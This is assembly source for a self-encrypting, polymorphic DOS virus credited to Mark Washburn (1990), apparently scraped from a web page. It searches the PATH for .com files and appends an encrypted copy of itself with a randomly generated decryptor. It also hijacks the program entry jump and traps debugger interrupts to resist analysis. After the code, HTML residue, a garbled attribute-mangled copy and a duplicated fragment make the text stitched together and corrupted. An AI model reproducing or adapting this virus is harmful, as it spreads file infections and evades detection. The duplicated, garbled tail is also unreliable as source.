

;
;
; Copyright (C) Mark Washburn, 1990.  All Rights Reserved
;
;
; Inquires are directed to :
; Mark Washburn
; 4656 Polk Street NE
; Columbia Heights, MN 55421
; USA
;
;
;
;
code		segment	public 'CODE'
		org	100h
;
		assume	cs:code,ds:code,es:code
;

stopdebug       equ 1 ; define this for disassembly trap code
int1vec         equ 4
int3vec         equ 12
;
dta_ptr         equ -4
file_crea       equ -8
file_attr       equ -10
path_start_ptr  equ -12
file_start_ptr  equ -14
RAND_SEED       equ -16
ptr1            equ -18 ; pointer to start of loop code
ptr2            equ -20 ; save data_begin pointer
dat1            equ -22 ; the random code used
dat2            equ -24 ; the decode length plus random length offset, max_msk
                        ; to make the decode routine more difficult to detect
dat3            equ -26 ; the 'necessary crypt code' mask
;
IFNDEF stopdebug
local_stack     equ 26
max_msk         equ 0ffh ; this determines the maximum variance of length
ELSE
nobugptr        equ -28
oldint3         equ -32
oldint1         equ -36
local_stack     equ 36
max_msk         equ 0ffh ; this determines the maximum variance of length
ENDIF
;
;
;
doscall         macro   call_type
                ifnb    <call_type>
                mov     ah, call_type
                endif
                int     21h
                endm
;
setloc          macro   arg1,reg2
                mov     [bp + arg1],reg2
                endm
;
getloc          macro   reg1,arg2
                mov     reg1,[bp + arg2]
                endm
;
setdat          macro   arg1,reg2
                mov     [si + offset arg1 - offset data_begin],reg2
                endm
;
getdat          macro   reg1,arg2
                mov     reg1,[si + offset arg2 - offset data_begin]
                endm
;
regofs          macro   reg1,arg2
                mov     reg1,si
                add     reg1,offset (arg2 - data_begin)
                endm
;
NOBUG1          macro
IFDEF stopdebug
                INT 3
                NOP
ENDIF
                endm
;
nobug2          macro
IFDEF stopdebug
                INT 3
ENDIF
                endm
;
;
start:
                jmp	entry
;
;
;
                MOV     AH,0
                INT     021h ; program code
;                db      600h-6 dup (0)
; insert utility code here
;
entry:
; space for decode routine
IFDEF stopdebug
                call precrypt
                db      36 dup (090h) ; calculated length of offset(t41-t10)
ELSE
                db      39 dup (090h) ; calculated length of offset(t41-t10)
ENDIF
;
; label the start of encoded section
entry2:
                mov     bp,sp   ; allocate locals
                sub     sp,local_stack
;
                push    cx
movcmd:         ; this label is used to locate the next instruction
                mov     dx,offset data_begin
                setloc  ptr2,dx ; save - will be modified in 'gencode'
IFDEF stopdebug
;
; save interrupt 1 and 3 vectors
;
                push    ds
                mov     ax,0
                push    ax
                pop     ds
                cli
                mov     ax,ds:[int1vec]
                setloc  oldint1,ax
                mov     ax,ds:[int1vec+2]
                setloc  oldint1+2,ax
                mov     ax,ds:[int3vec]
                setloc  oldint3,ax
                mov     ax,ds:[int3vec+2]
                setloc  oldint3+2,ax
                sti
                pop     ds
;
                call    bugon
ENDIF
                mov     si,dx
                add     si,(offset old_code - offset data_begin)
                mov     di,0100h
                mov     cx,03h
                cld
                repz movsb
                mov     si,dx
                doscall 30h ; check DOS version
                cmp     al,0
                NOBUG1 ; 0
                jnz     cont1 ; DOS > 2.0
                jmp     exit
cont1:
                push    es
                doscall 2fh ; get program DTA
                NOBUG1 ; 0
                setloc  dta_ptr,bx
                NOBUG1 ; 0
                setloc  dta_ptr+2,es
                pop     es
                regofs  dx,my_dta
                doscall 1ah ; set new DTA
                push    es
                push    si
                mov     es,ds:[02ch] ; environment address
                mov     di,0
loop1:
                pop     si
                push    si
                add     si,(offset path_chars - offset data_begin)
                lodsb
                mov     cx,8000h
                repnz scasb
                mov     cx,4
loop2:
                lodsb
                scasb
                jnz     loop1
                loop    loop2
                pop     si
                pop     es
                setloc  path_start_ptr,di
                mov     bx,si
                add     si,offset (file_name-data_begin)
                mov     di,si
                jmp     cont6
                nobug2
next_path:
                cmp     word ptr [bp + path_start_ptr],0
                jnz     cont3
                jmp     exit2
                nobug2
cont3:
                push    ds
                push    si
                mov     ds,es:[002ch]

                mov     di,si
                mov     si,es:[bp+path_start_ptr]
                add     di,offset (file_name-data_begin)
loop3:
                lodsb
                cmp     al,';' ; 3bh
                jz      cont4
                cmp     al,0
                jz      cont5
                stosb
                jmp     loop3
                nobug2
cont5:
                mov     si,0
cont4:
                pop     bx
                pop     ds
                mov     [bp+path_start_ptr],si
                cmp     ch,0ffh
                jz      cont6
                mov     al,'\' ; 5ch
                stosb
cont6:
                mov     [bp+file_start_ptr],di
                mov     si,bx
                add     si,(offset com_search-offset data_begin)
                mov     cx,6
                repz movsb
                mov     si,bx
                mov     ah,04eh
                regofs  dx,file_name
                mov     cx,3
                doscall
                jmp     cont7
                nobug2
next_file:
                doscall 04fh
cont7:
                jnb     cont8
                jmp     next_path
                nobug2
cont8:
                mov     ax,[si+offset(my_dta-data_begin)+016h] ; low time byte
                and     al,01fh
                cmp     al,01fh
                jz      next_file
IFNDEF stopdebug
                cmp     word ptr [si+offset(my_dta-data_begin)+01ah],0fa00h
                        ; file length compared; need 1.5 k spare, see rnd off
ELSE
                cmp     word ptr [si+offset(my_dta-data_begin)+01ah],0f800h
ENDIF
                jz      next_file                 ;    with virus length
                cmp     word ptr [si+offset(my_dta-data_begin)+01ah],0ah
                        ; file to short
                jz      next_file
                mov     di,[bp+file_start_ptr]
                push    si
                add     si,offset(my_dta-data_begin+01eh)
move_name:
                lodsb
                stosb
                cmp     al,0
                jnz     move_name
                pop     si
                mov     ax,04300h
                regofs  dx,file_name
                doscall
                setloc  file_attr,cx
                mov     ax,04301h
                and     cx,0fffeh
                regofs  dx,file_name
                doscall
                mov     ax,03d02h
                regofs  dx,file_name
                doscall
                jnb     cont9
                jmp     exit3
                nobug2
cont9:
                mov     bx,ax
                mov     ax,05700h
                doscall
                setloc  file_crea,cx
                setloc  file_crea+2,dx
cont10:
                mov     ah,3fh
                mov     cx,3
                regofs  dx,old_code
                doscall
                NOBUG1 ; 1
                jb      cont98
                NOBUG1
                cmp     ax,3
                NOBUG1
                jnz     cont98
                NOBUG1
                mov     ax,04202h
                NOBUG1 ;1
                mov     cx,0
                mov     dx,0
                doscall
                jnb     cont99
cont98:
                jmp     exit4
cont99:
                NOBUG1 ; 2
                push    bx ; save file handle
                NOBUG1
                mov     cx,ax
                push    cx
                NOBUG1
                sub     ax,3
                NOBUG1
                setdat  jump_code+1,ax
                add     cx,(offset data_begin-offset entry+0100h)
                NOBUG1
                mov     di,si
                NOBUG1
                sub     di,offset data_begin-offset movcmd-1
                NOBUG1
                mov     [di],cx
;
                doscall 02ch  ; seed the random number generator
                xor     dx,cx
                NOBUG1
                setloc  rand_seed,dx
                NOBUG1 ; 2
                call    random
                NOBUG1 ; 3
                getloc  ax,rand_seed
                NOBUG1 ; 3
                and     ax,max_msk ; add a random offset to actual length
                NOBUG1 ; 3
                add     ax,offset (data_end-entry2) ; set decode length
                NOBUG1 ; 3
                setloc  dat2,ax ; save the decode length
                NOBUG1 ; 3
                setdat  (t13+1),ax ; set decode length in 'mov cx,xxxx'
                pop     cx ; restore the code length of file to be infected
                NOBUG1 ; 3
                add     cx,offset (entry2-entry+0100h) ; add the length
                              ; of uncoded area plus file offset
                setdat  (t11+1),cx ;  set decode begin in 'mov di,xxxx'
                NOBUG1  ; 3
                call    random
                getloc  ax,rand_seed
                NOBUG1  ; 3
                setloc  dat1,ax ; save this random key in dat1
                setdat  (t12+1),ax ; set random key in 'mov ax,xxxx'
                NOBUG1  ; 3
                mov     di,si
                NOBUG1  ; 3
                sub     di,offset (data_begin-entry)
                NOBUG1  ; 3
                mov     bx,si
                add     bx,offset (l11-data_begin) ; table L11 address
                mov     word ptr [bp+dat3],000000111b ; required routines
                call    gen2 ; generate first part of decrypt
                setloc  ptr1,di  ; save the current counter to resolve 'loop'
                add     bx,offset (l21-l11) ; add then next tables' offset
                NOBUG1  ; 3
                mov     word ptr [bp+dat3],010000011b ; required plus 'nop'
                NOBUG1  ; 3
                call    gen2 ; generate second part of decrypt
                add     bx,offset (l31-l21) ; add the next offset
                NOBUG1
                call    gen2 ; generate third part of decrypt
                mov     cx,2 ; store the loop code
                getloc  si,ptr2
                NOBUG1 ; 3
                add     si,offset (t40-t10) ; point to the code
                repz    movsb ; move the code
                getloc  ax,ptr1 ; the loop address pointer
                sub     ax,di ; the current address
                dec     di ; point to the jump address
                stosb   ; resolve the jump
; fill in the remaining code
l991:
                getloc  cx,ptr2 ; get the data_begin pointer
                sub     cx,offset (data_begin-entry2) ; locate last+1 entry
                cmp     cx,di ; are we there yet?
                je      l992 ; if not then fill some more space
                mov     dx,0h ; any code is ok
                call    gencode ; generate the code
                jmp     l991
                nobug2
l992:
                getloc  si,ptr2 ; restore si to point to data area ;
                push    si
                mov     di,si
                NOBUG1  ; 4
                mov     cx,offset(end1-begin1) ;   move code
                add     si,offset(begin1-data_begin)
                NOBUG1 ; 4
                add     di,offset(data_end-data_begin+max_msk) ; add max_msk
                mov     dx,di ; set subroutine start
                repz    movsb  ; move the code
                pop     si
                pop     bx ; restore handle
                call    setrtn ; find this address
                add     ax,06h ; <- the number necessary for proper return
                push    ax
                jmp     dx ; continue with mask & write code
; continue here after return from mask & write code
                nobug1 ; 4
                jb      exit4
                cmp     ax,offset(data_end-entry)
                nobug1 ; 4
                jnz     exit4
                mov     ax,04200h
                mov     cx,0
                mov     dx,0
                doscall
                jb      exit4
                mov     ah,040h
                mov     cx,3
                nobug1 ; 4
                regofs  dx,jump_code
                doscall
exit4:
                getloc  dx,file_crea+2
                getloc  cx,file_crea
                and     cx,0ffe0h
                or      cx,0001fh
                mov     ax,05701h
                doscall
                doscall 03eh ; close file
exit3:
                mov     ax,04301h
                getloc  cx,file_attr
                regofs  dx,file_name
                doscall
exit2:
                push    ds
                getloc  dx,dta_ptr
                getloc  ds,dta_ptr+2
                doscall 01ah
                pop     ds
exit:
                pop     cx
                xor     ax,ax
                xor     bx,bx
                xor     dx,dx
                xor     si,si
                mov     sp,bp ; deallocate locals
                mov     di,0100h
                push    di
                call    bugoff
                ret
;
; common subroutines
;
;
random	        proc	near
;
	        getloc	cx,rand_seed	; get the seed
                xor     cx,813ch        ; xor random pattern
	        add	cx,9248h	; add random pattern
	        ror	cx,1		; rotate
	        ror	cx,1		; three
	        ror	cx,1		; times.
	        setloc	rand_seed,cx	; put it back
                and     cx,7            ; only need lower 3 bits
                push    cx
                inc     cx
                xor     ax,ax
                stc
                rcl     ax,cl
                pop     cx
	        ret			; return
;
random	        endp
;
setrtn          proc    near
;
                pop     ax       ; ret near
                push    ax
                ret
;
setrtn          endp
;
gencode         proc    near
;
l999:
                call    random
                test    dx,ax  ; has this code been used yet?
                jnz     l999   ; if this code was generated - try again
                or      dx,ax ; set the code as used in dx
                mov     ax,cx ; the look-up index
                sal     ax,1
                push    ax
                xlat
                mov     cx,ax ; the count of instructions
                pop     ax
                inc     ax
                xlat
                add     ax,[bp+ptr2] ; ax = address of code to be moved
                mov     si,ax
                repz    movsb   ; move the code into place
                ret
;
gencode         endp
;
gen2            proc    near
;
                mov     dx,0h ; used code
l990:
                call    gencode
                mov     ax,dx ; do we need more code
                and     ax,[bp+dat3] ; the mask for the required code
                cmp     ax,[bp+dat3]
                jne     l990 ; if still need required code - loop again
                ret
;
gen2            endp
;
ifdef stopdebug
doint3:
                push    bx
                mov     bx,sp
                push    ax
                push    si
                mov     si,word ptr [bx+02]
                inc     word ptr [bx+02] ; point to next address
                setloc  nobugptr,si
                lodsb   ; get the byte following int 3
                xor     byte ptr [si],al
                mov     al,[bx+7] ; set the trap flag
                or      al,1
                mov     [bx+7],al
                pop     si
                pop     ax
                pop     bx
                iret
;
doint1:
                push    bx
                mov     bx,sp
                push    ax
                push    si
                getloc  si,nobugptr
                lodsb
                xor     byte ptr [si],al
                mov     al,[bx+7] ; clear the trap flag
                and     al,0feh
                mov     [bx+7],al
                pop     si
                pop     ax
                pop     bx
bugiret:
                iret
;
bugon:
                pushf
                push    ds
                push    ax
                mov     ax,0
                push    ax
                pop     ds
                getloc  ax,ptr2
                sub     ax,offset(data_begin-doint3)
                cli
                mov     ds:[int3vec],ax
                getloc  ax,ptr2
                sub     ax,offset(data_begin-doint1)
                mov     ds:[int1vec],ax
                push    cs
                pop     ax
                mov     ds:[int1vec+2],ax
                mov     ds:[int3vec+2],ax
                sti
                pop     ax
                pop     ds
                popf
                ret
;
bugoff:
                pushf
                push    ds
                push    ax
                mov     ax,0
                push    ax
                pop     ds

                getloc  ax,oldint3
                cli
                mov     ds:[int3vec],ax
                getloc  ax,oldint1
                mov     ds:[int1vec],ax
                getloc  ax,oldint1+2
                mov     ds:[int1vec+2],ax
                getloc  ax,oldint3+2
                mov     ds:[int3vec+2],ax
                sti

                pop     ax
                pop     ds
                popf
                ret
;
endif
;
;
; the data area
;
data_begin       label near
;
t10              label near
t11:             mov di,0ffffh
t12:             mov ax,0ffffh
t13:             mov cx,0ffffh
t14:             clc
t15:             cld
t16:             inc si
t17:             dec bx
t18:             nop
t19              label near
;
t20              label near
t21:             xor [di],ax
t22:             xor [di],cx
t23:             xor dx,cx
t24:             xor bx,cx
t25:             sub bx,ax
t26:             sub bx,cx
t27:             sub bx,dx
t28:             nop
t29              label near
;
t30              label near
t31:             inc ax
t32:             inc di
t33:             inc bx
t34:             inc si
t35:             inc dx
t36:             clc
t37:             dec bx
t38:             nop
t39              label near
;
t40:             loop t20
t41              label near
;
l11:             db offset (t12-t11),offset (t11-data_begin)
l12:             db offset (t13-t12),offset (t12-data_begin)
l13:             db offset (t14-t13),offset (t13-data_begin)
l14:             db offset (t15-t14),offset (t14-data_begin)
l15:             db offset (t16-t15),offset (t15-data_begin)
l16:             db offset (t17-t16),offset (t16-data_begin)
l17:             db offset (t18-t17),offset (t17-data_begin)
l18:             db offset (t19-t18),offset (t18-data_begin)
;
l21:             db offset (t22-t21),offset (t21-data_begin)
l22:             db offset (t23-t22),offset (t22-data_begin)
l23:             db offset (t24-t23),offset (t23-data_begin)
l24:             db offset (t25-t24),offset (t24-data_begin)
l25:             db offset (t26-t25),offset (t25-data_begin)
l26:             db offset (t27-t26),offset (t26-data_begin)
l27:             db offset (t28-t27),offset (t27-data_begin)
l28:             db offset (t29-t28),offset (t28-data_begin)
;
l31:             db offset (t32-t31),offset (t31-data_begin)
l32:             db offset (t33-t32),offset (t32-data_begin)
l33:             db offset (t34-t33),offset (t33-data_begin)
l34:             db offset (t35-t34),offset (t34-data_begin)
l35:             db offset (t36-t35),offset (t35-data_begin)
l36:             db offset (t37-t36),offset (t36-data_begin)
l37:             db offset (t38-t37),offset (t37-data_begin)
l38:             db offset (t39-t38),offset (t38-data_begin)
;
;
;
; this routine is relocated after the end of data area
; this routine encrypts, writes, and decrypts the virus code
;
begin1:
                getloc  cx,dat2 ; get off (data_end-entry2) plus max_msk
                getloc  ax,dat1 ; get decode ket
                mov     di,si ; and set the begin encrypt address
                sub     di,offset (data_begin-entry2)
                call    crypt
                mov     ah,040h
                mov     cx,offset data_end-offset entry
                mov     dx,si
                sub     dx,offset data_begin-offset entry
                doscall
                pushf ; save the status of the write
                push    ax
                getloc  cx,dat2 ; get off (data_end-entry2) plus max_msk
                getloc  ax,dat1
                mov     di,si
                sub     di,offset (data_begin-entry2)
                call    crypt
                pop     ax      ; restore the dos write's status
                popf
                ret
;
crypt:
                xor     [di],ax
                xor     [di],cx
                inc     ax
                inc     di
                loop    crypt
                ret
end1:
;
; global work space and constants
;
old_code:       db 090h,090h,090h
jump_code:      db 0e9h,0,0
com_search:     db '*.com',0
path_chars:     db 'path='
file_name:      db 40h dup (0)
my_dta:         db 2bh dup (0)
                db 0,0,0

data_end        label near
ifdef stopdebug
;
scan_bytes      db 0cch,090h
;
precrypt:
                mov bp,sp   ; allocate locals
                sub sp,local_stack
                doscall 02ch  ; seed the random number generator
                xor dx,cx
                setloc rand_seed,dx
                call random
                mov di,offset start
                push ds
                pop es
lp999:
                mov cx,08000h
                mov si,offset scan_bytes
                lodsb
                repnz scasb
                cmp cx,0
                je done998
                cmp di,offset data_end
                jge done998
                lodsb
                scasb
                jnz lp999
                call random
                getloc ax,rand_seed
                dec di
                mov [di],al
                inc di
                xor [di],al
                inc di ; skip the masked byte
                jmp short lp999
done998:
                mov sp,bp
                ret
endif

code		ends
		end	start

</textarea></td></tr></table></body></html>
 the="" number="" necessary="" for="" proper="" return="" push="" ax="" jmp="" dx="" ;="" continue="" with="" mask="" &="" write="" code="" ;="" continue="" here="" after="" return="" from="" mask="" &="" write="" code="" nobug1="" ;="" 4="" jb="" exit4="" cmp="" ax,offset(data_end-entry)="" nobug1="" ;="" 4="" jnz="" exit4="" mov="" ax,04200h="" mov="" cx,0="" mov="" dx,0="" doscall="" jb="" exit4="" mov="" ah,040h="" mov="" cx,3="" nobug1="" ;="" 4="" regofs="" dx,jump_code="" doscall="" exit4:="" getloc="" dx,file_crea+2="" getloc="" cx,file_crea="" and="" cx,0ffe0h="" or="" cx,0001fh="" mov="" ax,05701h="" doscall="" doscall="" 03eh="" ;="" close="" file="" exit3:="" mov="" ax,04301h="" getloc="" cx,file_attr="" regofs="" dx,file_name="" doscall="" exit2:="" push="" ds="" getloc="" dx,dta_ptr="" getloc="" ds,dta_ptr+2="" doscall="" 01ah="" pop="" ds="" exit:="" pop="" cx="" xor="" ax,ax="" xor="" bx,bx="" xor="" dx,dx="" xor="" si,si="" mov="" sp,bp="" ;="" deallocate="" locals="" mov="" di,0100h="" push="" di="" call="" bugoff="" ret="" ;="" ;="" common="" subroutines="" ;="" ;="" random="" proc="" near="" ;="" getloc="" cx,rand_seed="" ;="" get="" the="" seed="" xor="" cx,813ch="" ;="" xor="" random="" pattern="" add="" cx,9248h="" ;="" add="" random="" pattern="" ror="" cx,1="" ;="" rotate="" ror="" cx,1="" ;="" three="" ror="" cx,1="" ;="" times.="" setloc="" rand_seed,cx="" ;="" put="" it="" back="" and="" cx,7="" ;="" only="" need="" lower="" 3="" bits="" push="" cx="" inc="" cx="" xor="" ax,ax="" stc="" rcl="" ax,cl="" pop="" cx="" ret="" ;="" return="" ;="" random="" endp="" ;="" setrtn="" proc="" near="" ;="" pop="" ax="" ;="" ret="" near="" push="" ax="" ret="" ;="" setrtn="" endp="" ;="" gencode="" proc="" near="" ;="" l999:="" call="" random="" test="" dx,ax="" ;="" has="" this="" code="" been="" used="" yet?="" jnz="" l999="" ;="" if="" this="" code="" was="" generated="" -="" try="" again="" or="" dx,ax="" ;="" set="" the="" code="" as="" used="" in="" dx="" mov="" ax,cx="" ;="" the="" look-up="" index="" sal="" ax,1="" push="" ax="" xlat="" mov="" cx,ax="" ;="" the="" count="" of="" instructions="" pop="" ax="" inc="" ax="" xlat="" add="" ax,[bp+ptr2]="" ;="" ax="address" of="" code="" to="" be="" moved="" mov="" si,ax="" repz="" movsb="" ;="" move="" the="" code="" into="" place="" ret="" ;="" gencode="" endp="" ;="" gen2="" proc="" near="" ;="" mov="" dx,0h="" ;="" used="" code="" l990:="" call="" gencode="" mov="" ax,dx="" ;="" do="" we="" need="" more="" code="" and="" ax,[bp+dat3]="" ;="" the="" mask="" for="" the="" required="" code="" cmp="" ax,[bp+dat3]="" jne="" l990="" ;="" if="" still="" need="" required="" code="" -="" loop="" again="" ret="" ;="" gen2="" endp="" ;="" ifdef="" stopdebug="" doint3:="" push="" bx="" mov="" bx,sp="" push="" ax="" push="" si="" mov="" si,word="" ptr="" [bx+02]="" inc="" word="" ptr="" [bx+02]="" ;="" point="" to="" next="" address="" setloc="" nobugptr,si="" lodsb="" ;="" get="" the="" byte="" following="" int="" 3="" xor="" byte="" ptr="" [si],al="" mov="" al,[bx+7]="" ;="" set="" the="" trap="" flag="" or="" al,1="" mov="" [bx+7],al="" pop="" si="" pop="" ax="" pop="" bx="" iret="" ;="" doint1:="" push="" bx="" mov="" bx,sp="" push="" ax="" push="" si="" getloc="" si,nobugptr="" lodsb="" xor="" byte="" ptr="" [si],al="" mov="" al,[bx+7]="" ;="" clear="" the="" trap="" flag="" and="" al,0feh="" mov="" [bx+7],al="" pop="" si="" pop="" ax="" pop="" bx="" bugiret:="" iret="" ;="" bugon:="" pushf="" push="" ds="" push="" ax="" mov="" ax,0="" push="" ax="" pop="" ds="" getloc="" ax,ptr2="" sub="" ax,offset(data_begin-doint3)="" cli="" mov="" ds:[int3vec],ax="" getloc="" ax,ptr2="" sub="" ax,offset(data_begin-doint1)="" mov="" ds:[int1vec],ax="" push="" cs="" pop="" ax="" mov="" ds:[int1vec+2],ax="" mov="" ds:[int3vec+2],ax="" sti="" pop="" ax="" pop="" ds="" popf="" ret="" ;="" bugoff:="" pushf="" push="" ds="" push="" ax="" mov="" ax,0="" push="" ax="" pop="" ds="" getloc="" ax,oldint3="" cli="" mov="" ds:[int3vec],ax="" getloc="" ax,oldint1="" mov="" ds:[int1vec],ax="" getloc="" ax,oldint1+2="" mov="" ds:[int1vec+2],ax="" getloc="" ax,oldint3+2="" mov="" ds:[int3vec+2],ax="" sti="" pop="" ax="" pop="" ds="" popf="" ret="" ;="" endif="" ;="" ;="" ;="" the="" data="" area="" ;="" data_begin="" label="" near="" ;="" t10="" label="" near="" t11:="" mov="" di,0ffffh="" t12:="" mov="" ax,0ffffh="" t13:="" mov="" cx,0ffffh="" t14:="" clc="" t15:="" cld="" t16:="" inc="" si="" t17:="" dec="" bx="" t18:="" nop="" t19="" label="" near="" ;="" t20="" label="" near="" t21:="" xor="" [di],ax="" t22:="" xor="" [di],cx="" t23:="" xor="" dx,cx="" t24:="" xor="" bx,cx="" t25:="" sub="" bx,ax="" t26:="" sub="" bx,cx="" t27:="" sub="" bx,dx="" t28:="" nop="" t29="" label="" near="" ;="" t30="" label="" near="" t31:="" inc="" ax="" t32:="" inc="" di="" t33:="" inc="" bx="" t34:="" inc="" si="" t35:="" inc="" dx="" t36:="" clc="" t37:="" dec="" bx="" t38:="" nop="" t39="" label="" near="" ;="" t40:="" loop="" t20="" t41="" label="" near="" ;="" l11:="" db="" offset="" (t12-t11),offset="" (t11-data_begin)="" l12:="" db="" offset="" (t13-t12),offset="" (t12-data_begin)="" l13:="" db="" offset="" (t14-t13),offset="" (t13-data_begin)="" l14:="" db="" offset="" (t15-t14),offset="" (t14-data_begin)="" l15:="" db="" offset="" (t16-t15),offset="" (t15-data_begin)="" l16:="" db="" offset="" (t17-t16),offset="" (t16-data_begin)="" l17:="" db="" offset="" (t18-t17),offset="" (t17-data_begin)="" l18:="" db="" offset="" (t19-t18),offset="" (t18-data_begin)="" ;="" l21:="" db="" offset="" (t22-t21),offset="" (t21-data_begin)="" l22:="" db="" offset="" (t23-t22),offset="" (t22-data_begin)="" l23:="" db="" offset="" (t24-t23),offset="" (t23-data_begin)="" l24:="" db="" offset="" (t25-t24),offset="" (t24-data_begin)="" l25:="" db="" offset="" (t26-t25),offset="" (t25-data_begin)="" l26:="" db="" offset="" (t27-t26),offset="" (t26-data_begin)="" l27:="" db="" offset="" (t28-t27),offset="" (t27-data_begin)="" l28:="" db="" offset="" (t29-t28),offset="" (t28-data_begin)="" ;="" l31:="" db="" offset="" (t32-t31),offset="" (t31-data_begin)="" l32:="" db="" offset="" (t33-t32),offset="" (t32-data_begin)="" l33:="" db="" offset="" (t34-t33),offset="" (t33-data_begin)="" l34:="" db="" offset="" (t35-t34),offset="" (t34-data_begin)="" l35:="" db="" offset="" (t36-t35),offset="" (t35-data_begin)="" l36:="" db="" offset="" (t37-t36),offset="" (t36-data_begin)="" l37:="" db="" offset="" (t38-t37),offset="" (t37-data_begin)="" l38:="" db="" offset="" (t39-t38),offset="" (t38-data_begin)="" ;="" ;="" ;="" ;="" this="" routine="" is="" relocated="" after="" the="" end="" of="" data="" area="" ;="" this="" routine="" encrypts,="" writes,="" and="" decrypts="" the="" virus="" code="" ;="" begin1:="" getloc="" cx,dat2="" ;="" get="" off="" (data_end-entry2)="" plus="" max_msk="" getloc="" ax,dat1="" ;="" get="" decode="" ket="" mov="" di,si="" ;="" and="" set="" the="" begin="" encrypt="" address="" sub="" di,offset="" (data_begin-entry2)="" call="" crypt="" mov="" ah,040h="" mov="" cx,offset="" data_end-offset="" entry="" mov="" dx,si="" sub="" dx,offset="" data_begin-offset="" entry="" doscall="" pushf="" ;="" save="" the="" status="" of="" the="" write="" push="" ax="" getloc="" cx,dat2="" ;="" get="" off="" (data_end-entry2)="" plus="" max_msk="" getloc="" ax,dat1="" mov="" di,si="" sub="" di,offset="" (data_begin-entry2)="" call="" crypt="" pop="" ax="" ;="" restore="" the="" dos="" write's="" status="" popf="" ret="" ;="" crypt:="" xor="" [di],ax="" xor="" [di],cx="" inc="" ax="" inc="" di="" loop="" crypt="" ret="" end1:="" ;="" ;="" global="" work="" space="" and="" constants="" ;="" old_code:="" db="" 090h,090h,090h="" jump_code:="" db="" 0e9h,0,0="" com_search:="" db="" '*.com',0="" path_chars:="" db="" 'path=''></- the number necessary for proper return
                push    ax
                jmp     dx ; continue with mask & write code
; continue here after return from mask & write code
                nobug1 ; 4
                jb      exit4
                cmp     ax,offset(data_end-entry)
                nobug1 ; 4
                jnz     exit4
                mov     ax,04200h
                mov     cx,0
                mov     dx,0
                doscall
                jb      exit4
                mov     ah,040h
                mov     cx,3
                nobug1 ; 4
                regofs  dx,jump_code
                doscall
exit4:
                getloc  dx,file_crea+2
                getloc  cx,file_crea
                and     cx,0ffe0h
                or      cx,0001fh
                mov     ax,05701h
                doscall
                doscall 03eh ; close file
exit3:
                mov     ax,04301h
                getloc  cx,file_attr
                regofs  dx,file_name
                doscall
exit2:
                push    ds
                getloc  dx,dta_ptr
                getloc  ds,dta_ptr+2
                doscall 01ah
                pop     ds
exit:
                pop     cx
                xor     ax,ax
                xor     bx,bx
                xor     dx,dx
                xor     si,si
                mov     sp,bp ; deallocate locals
                mov     di,0100h
                push    di
                call    bugoff
                ret
;
; common subroutines
;
;
random	        proc	near
;
	        getloc	cx,rand_seed	; get the seed
                xor     cx,813ch        ; xor random pattern
	        add	cx,9248h	; add random pattern
	        ror	cx,1		; rotate
	        ror	cx,1		; three
	        ror	cx,1		; times.
	        setloc	rand_seed,cx	; put it back
                and     cx,7            ; only need lower 3 bits
                push    cx
                inc     cx
                xor     ax,ax
                stc
                rcl     ax,cl
                pop     cx
	        ret			; return
;
random	        endp
;
setrtn          proc    near
;
                pop     ax       ; ret near
                push    ax
                ret
;
setrtn          endp
;
gencode         proc    near
;
l999:
                call    random
                test    dx,ax  ; has this code been used yet?
                jnz     l999   ; if this code was generated - try again
                or      dx,ax ; set the code as used in dx
                mov     ax,cx ; the look-up index
                sal     ax,1
                push    ax
                xlat
                mov     cx,ax ; the count of instructions
                pop     ax
                inc     ax
                xlat
                add     ax,[bp+ptr2] ; ax = address of code to be moved
                mov     si,ax
                repz    movsb   ; move the code into place
                ret
;
gencode         endp
;
gen2            proc    near
;
                mov     dx,0h ; used code
l990:
                call    gencode
                mov     ax,dx ; do we need more code
                and     ax,[bp+dat3] ; the mask for the required code
                cmp     ax,[bp+dat3]
                jne     l990 ; if still need required code - loop again
                ret
;
gen2            endp
;
ifdef stopdebug
doint3:
                push    bx
                mov     bx,sp
                push    ax
                push    si
                mov     si,word ptr [bx+02]
                inc     word ptr [bx+02] ; point to next address
                setloc  nobugptr,si
                lodsb   ; get the byte following int 3
                xor     byte ptr [si],al
                mov     al,[bx+7] ; set the trap flag
                or      al,1
                mov     [bx+7],al
                pop     si
                pop     ax
                pop     bx
                iret
;
doint1:
                push    bx
                mov     bx,sp
                push    ax
                push    si
                getloc  si,nobugptr
                lodsb
                xor     byte ptr [si],al
                mov     al,[bx+7] ; clear the trap flag
                and     al,0feh
                mov     [bx+7],al
                pop     si
                pop     ax
                pop     bx
bugiret:
                iret
;
bugon:
                pushf
                push    ds
                push    ax
                mov     ax,0
                push    ax
                pop     ds
                getloc  ax,ptr2
                sub     ax,offset(data_begin-doint3)
                cli
                mov     ds:[int3vec],ax
                getloc  ax,ptr2
                sub     ax,offset(data_begin-doint1)
                mov     ds:[int1vec],ax
                push    cs
                pop     ax
                mov     ds:[int1vec+2],ax
                mov     ds:[int3vec+2],ax
                sti
                pop     ax
                pop     ds
                popf
                ret
;
bugoff:
                pushf
                push    ds
                push    ax
                mov     ax,0
                push    ax
                pop     ds

                getloc  ax,oldint3
                cli
                mov     ds:[int3vec],ax
                getloc  ax,oldint1
                mov     ds:[int1vec],ax
                getloc  ax,oldint1+2
                mov     ds:[int1vec+2],ax
                getloc  ax,oldint3+2
                mov     ds:[int3vec+2],ax
                sti

                pop     ax
                pop     ds
                popf
                ret
;
endif
;
;
; the data area
;
data_begin       label near
;
t10              label near
t11:             mov di,0ffffh
t12:             mov ax,0ffffh
t13:             mov cx,0ffffh
t14:             clc
t15:             cld
t16:             inc si
t17:             dec bx
t18:             nop
t19              label near
;
t20              label near
t21:             xor [di],ax
t22:             xor [di],cx
t23:             xor dx,cx
t24:             xor bx,cx
t25:             sub bx,ax
t26:             sub bx,cx
t27:             sub bx,dx
t28:             nop
t29              label near
;
t30              label near
t31:             inc ax
t32:             inc di
t33:             inc bx
t34:             inc si
t35:             inc dx
t36:             clc
t37:             dec bx
t38:             nop
t39              label near
;
t40:             loop t20
t41              label near
;
l11:             db offset (t12-t11),offset (t11-data_begin)
l12:             db offset (t13-t12),offset (t12-data_begin)
l13:             db offset (t14-t13),offset (t13-data_begin)
l14:             db offset (t15-t14),offset (t14-data_begin)
l15:             db offset (t16-t15),offset (t15-data_begin)
l16:             db offset (t17-t16),offset (t16-data_begin)
l17:             db offset (t18-t17),offset (t17-data_begin)
l18:             db offset (t19-t18),offset (t18-data_begin)
;
l21:             db offset (t22-t21),offset (t21-data_begin)
l22:             db offset (t23-t22),offset (t22-data_begin)
l23:             db offset (t24-t23),offset (t23-data_begin)
l24:             db offset (t25-t24),offset (t24-data_begin)
l25:             db offset (t26-t25),offset (t25-data_begin)
l26:             db offset (t27-t26),offset (t26-data_begin)
